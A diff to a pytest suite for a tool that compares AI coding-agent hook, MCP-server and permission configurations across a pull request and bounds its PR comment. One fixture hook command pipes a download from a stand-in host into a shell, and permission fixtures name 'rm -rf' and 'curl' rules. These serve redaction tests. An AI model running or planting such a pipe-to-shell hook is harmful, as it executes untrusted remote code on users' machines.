@@ -28,7 +28,8 @@ What is pinned here:
   leave it out, so a `0.6` baseline compares as it did and may be re-saved,
   and a saved baseline holds none of it;
 - a reorder never claims the handlers are the same, and long entries never
-  push a row, the change count or the review question out of the PR comment;
+  push a line `1.1.0` kept out of the PR comment: a row, the coverage block,
+  the review question, the reproduction or the advisory;
 - that plugin-selected and Codex hooks keep their loading basis, and a
   declaration outside the documented shape names the limit instead of a guess.
 """
@@ -37,6 +38,7 @@ from __future__ import annotations
 
 import hashlib
 import json
+from collections import Counter
 from pathlib import Path
 
 import pytest
@@ -60,6 +62,17 @@ from agents_shipgate.core.host_grants import (
     normalized_host_grants,
     redacted_config_sha256,
 )
+from agents_shipgate.report.host_comparison import (
+    ENTRIES_SHORTENED,
+    ENTRY_MIN_CHARS,
+    MARKDOWN_COVERAGE_MAX_CHARS,
+    coverage_budget,
+    entry_text,
+    host_comparison_lines,
+    presented_changes,
+    with_entries_in_room,
+)
+from agents_shipgate.schemas.host_comparison import HostComparison
 from agents_shipgate.schemas.host_grants import HostGrantsBaselineV6
 from tests.test_host_diff_review_changes import (
     _check,
@@ -330,22 +343,23 @@ def test_a_timeout_written_as_another_number_names_both(tmp_path: Path) -> None:
 
 
 @pytest.mark.parametrize(
-    ("head", "change"),
+    ("base", "head", "change"),
     [
-        ("5", 'PostToolUse: timeout 5 → "5"'),
-        ("1e+100", 'PostToolUse: timeout 5 → "1e+100"'),
-        # Text that does not read as a finite number is printed as it is.
-        ("5s", "PostToolUse: timeout 5 → 5s"),
-        ("inf", "PostToolUse: timeout 5 → inf"),
+        (5, "5", 'PostToolUse: timeout 5 → "5"'),
+        (5, "1e+100", 'PostToolUse: timeout 5 → "1e+100"'),
+        (5, "5s", 'PostToolUse: timeout 5 → "5s"'),
+        # A boolean or a non-finite number and the word a string spells for
+        # it published alike and read "no difference" (#819 review, cycle 6).
+        (True, "true", 'PostToolUse: timeout true → "true"'),
+        (float("inf"), "inf", 'PostToolUse: timeout <not-shown> → "inf"'),
+        (float("nan"), "nan", 'PostToolUse: timeout <not-shown> → "nan"'),
     ],
 )
-def test_a_timeout_written_as_text_that_reads_as_a_number_is_quoted(
-    tmp_path: Path, head: str, change: str
-) -> None:
-    """`"timeout": 5` → `"5"` read `timeout 5 → 5` (#819 review, cycle 5)."""
+def test_a_timeout_written_as_text_is_quoted(tmp_path: Path, base: object, head: str, change: str) -> None:
+    """`"timeout": 5` → `"5"` read `timeout 5 → 5` (#819 review, cycle 5), and `true` → `"true"` no difference (cycle 6)."""
 
     repo = _repository(
-        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", 5)}, {SETTINGS: _hooks("Edit", "bin/lint.sh", head)}
+        tmp_path, {SETTINGS: _hooks("Edit", "bin/lint.sh", base)}, {SETTINGS: _hooks("Edit", "bin/lint.sh", head)}
     )
     [hook] = _grants(repo, "hook")
     assert hook["handlers"][0]["timeout"] == head
@@ -395,11 +409,14 @@ def test_an_over_long_timeout_integer_is_published_as_bounded_text_on_every_rout
         (-(10**MAX_DETAIL_WORD_CHARS), "-1" + "0" * (MAX_DETAIL_WORD_CHARS - 3) + "…"),
         (2**400, str(2**400)[: MAX_DETAIL_WORD_CHARS - 1] + "…"),
         (HUGE_TIMEOUT, "1" + "0" * (MAX_DETAIL_WORD_CHARS - 2) + "…"),
-        (float("inf"), "inf"),
-        (float("-inf"), "-inf"),
-        (float("nan"), "nan"),
-        (True, "true"),
+        # JSON has no spelling for these, and `inf` is a word a string may be.
+        (float("inf"), DETAIL_NOT_SHOWN),
+        (float("-inf"), DETAIL_NOT_SHOWN),
+        (float("nan"), DETAIL_NOT_SHOWN),
+        (True, True),
+        (False, False),
         ("30s", "30s"),
+        ("true", "true"),
         # Text that is not a plain token is not published.
         ("--token tokentimeout-canary", DETAIL_NOT_SHOWN),
         ("30 seconds", DETAIL_NOT_SHOWN),
@@ -877,11 +894,42 @@ def test_a_matcher_past_the_input_bound_is_not_shown_and_never_redacted(tmp_path
     ]
 
 
-# --- the PR comment keeps every row -----------------------------------------
+def test_a_matcher_is_bounded_as_the_digest_input_holds_it(tmp_path: Path) -> None:
+    """Two matchers the digest's input holds alike published two values (#819 review, cycle 6).
+
+    The bound was on the file's text, so `Bash(TOKEN=<10 characters> x)`
+    published `Bash(TOKEN=<redacted> x)` and the same rule with a 1,100
+    character value `<not-shown>`, under one `config_sha256`.
+    """
+
+    grants = []
+    for length in (10, 1_100):
+        root = tmp_path / str(length)
+        matcher = f"Bash(TOKEN={'A' * length} x)"
+        _write(root, SETTINGS, {"hooks": {"PreToolUse": [
+            {"matcher": matcher, "hooks": [{"type": "command", "command": "bin/a.sh"}]},
+        ]}})
+        [hook] = _grants(root, "hook")
+        grants.append(hook)
+    assert len(f"Bash(TOKEN={'A' * 1_100} x)") > MAX_DETAIL_MATCHER_INPUT_CHARS
+    assert grants[0]["config_sha256"] == grants[1]["config_sha256"]
+    assert grants[0]["handlers"] == grants[1]["handlers"]
+    assert grants[0]["handlers"][0]["matcher"] == "Bash(TOKEN=<redacted> x)"
+    assert "AAAA" not in json.dumps(grants)
+
+
+# --- the PR comment keeps every line 1.1.0 kept ----------------------------
 
 
 def _long_matcher(tag: str, handler: int) -> str:
     return "|".join(f"mcp__{tag}{handler}_server{index}__tool" for index in range(4))
+
+
+ADVISORY = "Advisory: no application release policy configured. This comparison grants no merge authority."
+
+
+def _note_lines(comment: str) -> list[str]:
+    return [line for line in comment.splitlines() if line == ENTRIES_SHORTENED]
 
 
 @pytest.mark.parametrize("handlers", [3, 2])
@@ -922,11 +970,187 @@ def test_long_hook_entries_leave_every_row_and_the_review_question_in_the_pr_com
     assert "deny: Bash(rm -rf:*)" in comment and "allow: Bash(curl:*)" in comment
     assert verifier["host_comparison"]["review"]["question"] in comment
     assert "omitted" not in comment
-    # The entries that did not fit say so, and `verifier.json` holds them whole.
-    assert "(shortened here; `verifier.json` holds the whole entry)" in comment
+    # The entries that did not fit are shortened, and one line, not one per
+    # entry, says so and names `verifier.json` (#819 review, cycle 6).
+    assert len(_note_lines(comment)) == 1
+    assert comment.count("verifier.json` holds") == 1
     hook_entries = [change["change"] for change in changes if change["change"] and "matcher" in change["change"]]
     assert len(hook_entries) == len(events)
     assert all(len(entry) > 120 and "…" not in entry for entry in hook_entries)
+
+
+CLAUDE_EVENTS = ["Notification", "PostToolUse", "PreCompact", "PreToolUse", "SessionEnd", "SessionStart",
+                 "Stop", "SubagentStop", "UserPromptSubmit"]
+CODEX_EVENTS = ["PostToolUse", "PreToolUse", "SessionStart", "Stop", "UserPromptSubmit"]
+
+
+def _format_and_lint(events: list[str], prefix: str, **setting: object) -> dict:
+    return {"hooks": {event: [{"matcher": "Edit|Write|MultiEdit", "hooks": [
+        {"type": "command", "command": f"{prefix}/format.sh", "timeout": 30, **setting},
+        {"type": "command", "command": f"{prefix}/lint.sh", "timeout": 30, **setting},
+    ]}] for event in events}}
+
+
+#: The cycle-6 reproductions, as (base, head): a pull request that moves two
+#: hook scripts out of `.claude/hooks` and `.codex/hooks` under every event,
+#: the same with one event fewer, and one that makes 16 events' handlers
+#: async, a setting no entry shows.
+HOOK_MOVES = {
+    "moved-14": (
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, ".claude/hooks"),
+         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS, ".codex/hooks")},
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "scripts/hooks"),
+         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS, "scripts/hooks")},
+    ),
+    "moved-13": (
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, ".claude/hooks"),
+         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS[:4], ".codex/hooks")},
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "scripts/hooks"),
+         ".codex/hooks.json": _format_and_lint(CODEX_EVENTS[:4], "scripts/hooks")},
+    ),
+    "async-16": (
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "bin"),
+         ".codex/hooks.json": _format_and_lint([*CODEX_EVENTS, "Notification", "PreCompact"], "bin")},
+        {SETTINGS: _format_and_lint(CLAUDE_EVENTS, "bin", **{"async": True}),
+         ".codex/hooks.json": _format_and_lint(
+             [*CODEX_EVENTS, "Notification", "PreCompact"], "bin", **{"async": True}
+         )},
+    ),
+}
+
+
+@pytest.mark.parametrize("case", list(HOOK_MOVES))
+def test_long_hook_entries_leave_every_line_1_1_0_prints_in_the_pr_comment(tmp_path: Path, case: str) -> None:
+    """From about 13 long hook entries the comment lost what `1.1.0`'s kept (#819 review, cycle 6).
+
+    Each entry was cut to 120 characters and followed by its own 57-character
+    pointer, so the comment still did not fit, and its bound cut the
+    coverage block, the review question, the reproduction, the advisory and
+    the evidence line, and from 16 rows row headings too. `1.1.0` printed
+    every one of them within 6,000 characters.
+    """
+
+    base, head = HOOK_MOVES[case]
+    repo = _repository(tmp_path, base, head)
+    out = tmp_path / "out"
+    _block, _summary, verifier = _verify(repo, out)
+    comment = (out / "pr-comment.md").read_text(encoding="utf-8")
+    lines = comment.splitlines()
+    rows = verifier["host_comparison"]["rows"]
+    assert len(rows) == int(case.split("-")[1])
+    assert len(comment) <= 6000
+    assert "omitted" not in comment
+    # Every row heading with its entry and its why.
+    headings = [index for index, line in enumerate(lines) if line.startswith("- ") and " — " in line]
+    assert len(headings) == len(rows)
+    for index in headings:
+        assert lines[index + 1].startswith("  ` ") and lines[index + 1].endswith(" `")
+        assert lines[index + 2] == "  ` changes what runs around the agent's actions `"
+    # The coverage block, the question, the reproduction, the advisory and the evidence.
+    assert "What this run established:" in lines
+    assert any(line.startswith("- ` .claude/settings.json ` (claude-code): compared;") for line in lines)
+    assert any(line.startswith("- ` .codex/hooks.json ` (codex): compared;") for line in lines)
+    assert verifier["host_comparison"]["review"]["question"] in lines
+    assert any(line.startswith("Reproduce: check out ") for line in lines)
+    assert ADVISORY in lines
+    assert any(line.startswith("Evidence: `verifier.json` contains") for line in lines)
+    assert "### Agent instruction block" in lines
+    # Shortened entries are named once, never one pointer per entry.
+    assert len(_note_lines(comment)) == 1
+
+
+def test_a_bounded_comment_keeps_every_line_its_shortest_entries_would_print(tmp_path: Path) -> None:
+    """Whatever the room, every line printed with each entry in its shortest form stays (#819 review, cycle 6).
+
+    No entry in its shortest form is longer than the one `1.1.0` printed: a
+    hook change's `PreToolUse: …` against `PreToolUse → PreToolUse`, an MCP
+    server's `name: …` against `name: env keys +B`, an added grant's own
+    row, and a permission rule's entry unchanged. So the lines printed with
+    every entry that way hold every line `1.1.0` printed but the entries. For
+    each room from where they alone fit to where every entry fits whole, the
+    bounded lines fit, hold every one of those lines, and print each entry
+    whole, cut to at least ENTRY_MIN_CHARS characters ending in `…`, or in
+    its shortest form.
+    """
+
+    events = [f"Event{index:02d}" for index in range(18)]
+    servers = [f"server-with-a-rather-long-name-{index}" for index in range(3)]
+
+    def settings(prefix: str, added: bool) -> dict:
+        hooks = _format_and_lint([*events, *(["Added00"] if added else [])], prefix)
+        return {**hooks, "permissions": {"allow": ["Bash(curl:*)"]} if added else {"deny": ["Bash(rm -rf:*)"]}}
+
+    def mcp(version: str, env: list[str], added: bool) -> dict:
+        return {"mcpServers": {
+            name: {"command": "npx", "args": ["-y", f"example-mcp-server@{version}"], "env": dict.fromkeys(env, "x")}
+            for name in [*servers, *(["added-server"] if added else [])]
+        }}
+
+    repo = _repository(
+        tmp_path,
+        {SETTINGS: settings(".claude/hooks", False), ".mcp.json": mcp("1.2.3", ["A"], False)},
+        {SETTINGS: settings("scripts/hooks", True), ".mcp.json": mcp("1.2.4", ["A", "B"], True)},
+    )
+    _block, _summary, verifier = _verify(repo, tmp_path / "out")
+    comparison = HostComparison.model_validate(verifier["host_comparison"])
+    changes = presented_changes(comparison)
+    assert len(changes) == len(events) + len(servers) + 4
+
+    def lines_for(coverage: int, entry_max_chars: int | None, entry_note: bool) -> list[str]:
+        return host_comparison_lines(
+            comparison, markdown=True, coverage_max_chars=coverage,
+            entry_max_chars=entry_max_chars, entry_note=entry_note,
+        )
+
+    def size(lines: list[str]) -> int:
+        return len("\n".join(lines))
+
+    def printed_by_1_1_0(change) -> str:
+        """The entry line 1.1.0 printed, or for an added MCP server a line no longer than it."""
+
+        row = comparison.rows[change.row_indexes[0]]
+        if change.change is None:
+            return f"  ` {row.before} ` → ` {row.after} `"
+        if row.after in servers:
+            return f"  ` {row.after}: env keys +B `"
+        return f"  ` {row.before} ` → ` {row.after} `"
+
+    seen = set()
+    low, high = size(lines_for(0, 0, False)), size(lines_for(MARKDOWN_COVERAGE_MAX_CHARS, None, True))
+    for room in [*range(low, high, 37), high]:
+        lines = with_entries_in_room(comparison, lines_for, room)
+        assert size(lines) <= room
+        expected = lines_for(coverage_budget(comparison, lambda c: lines_for(c, 0, False), room), 0, False)
+        headings = [index for index, line in enumerate(expected) if line.startswith("- ") and " — " in line]
+        assert [lines[index] for index in headings] == [expected[index] for index in headings]
+        assert not Counter(line for index, line in enumerate(expected) if index - 1 not in headings) - Counter(lines)
+        kinds = set()
+        for index, change in zip(headings, changes, strict=True):
+            entry, whole = lines[index + 1], entry_text(change)
+            row = comparison.rows[change.row_indexes[0]]
+            whole_line = (
+                f"  ` {whole} `" if change.change is not None else f"  ` {change.before} ` → ` {change.after} `"
+            )
+            if row.disposition is not None:
+                # A permission rule's entry: never shortened, as 1.1.0 printed it.
+                assert entry == whole_line
+            elif entry == whole_line:
+                kinds.add("whole")
+            elif entry.endswith("… `") and len(entry) - 6 >= ENTRY_MIN_CHARS:
+                assert whole.startswith(entry[4:-3].removesuffix("…"))
+                kinds.add("cut")
+            else:
+                assert entry == (
+                    f"  ` {row.after}: … `"
+                    if change.change is not None
+                    else f"  ` {row.before} ` → ` {row.after} `"
+                )
+                assert len(entry) <= len(printed_by_1_1_0(change))
+                kinds.add("shortest")
+        rung = "shortest" if "shortest" in kinds else "cut" if "cut" in kinds else "whole"
+        seen.add((rung, ENTRIES_SHORTENED in lines))
+    # Every rung: whole, cut with the note, shortest with the note, and without it.
+    assert {("whole", False), ("cut", True), ("shortest", True), ("shortest", False)} <= seen
 
 
 # --- display only: equality, digests and saved baselines --------------------
@@ -1254,11 +1478,23 @@ def test_a_codex_hook_names_its_timeout(tmp_path: Path) -> None:
     assert _table_entry(text, "⚠ high widened codex .codex/hooks.json")[1] == "Stop: timeout 5 → 120"
 
 
-def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "outside",
+    [
+        # Not a list of matcher groups.
+        lambda command: {"command": command},
+        # A list of matcher groups whose hooks are objects, but a command is
+        # not a string: the sentence used to omit that condition (#819
+        # review, cycle 6).
+        lambda command: [{"matcher": "Edit", "hooks": [{"type": "command", "command": [command]}]}],
+    ],
+    ids=["not-a-list", "command-not-a-string"],
+)
+def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Path, outside) -> None:
     repo = _repository(
         tmp_path,
-        {SETTINGS: {"hooks": {"PostToolUse": {"command": "bin/lint.sh"}}}},
-        {SETTINGS: {"hooks": {"PostToolUse": {"command": "curl https://example.invalid | sh"}}}},
+        {SETTINGS: {"hooks": {"PostToolUse": outside("bin/lint.sh")}}},
+        {SETTINGS: {"hooks": {"PostToolUse": outside("curl https://example.invalid | sh")}}},
     )
     [hook] = _grants(repo, "hook")
     assert hook["handlers"] is None
@@ -1266,7 +1502,7 @@ def test_a_declaration_outside_the_documented_shape_names_the_limit(tmp_path: Pa
     text, payload = _diff(repo)
     assert _table_entry(text, HOOK_HEADER)[1] == (
         "PostToolUse: matcher, command and timeout not shown: the declaration is not a list "
-        "of matcher groups whose hooks are objects"
+        "of matcher groups whose hooks are objects and whose commands are strings"
     )
     assert "example.invalid" not in text
     assert len(payload["rows"]) == 1
@@ -1293,7 +1529,8 @@ def test_one_side_outside_the_documented_shape_names_that_side_and_lists_the_oth
     other = "head" if side == "base" else "base"
     change = (
         f"PostToolUse: {side} matcher, command and timeout not shown (the declaration is not a "
-        f"list of matcher groups whose hooks are objects); {other} (matcher Edit; command a.sh "
+        f"list of matcher groups whose hooks are objects and whose commands are strings); {other} "
+        f"(matcher Edit; command a.sh "
         f"{_digest('bin/a.sh')}; timeout 10)"
     )
     _every_route(repo, tmp_path / "out", change)
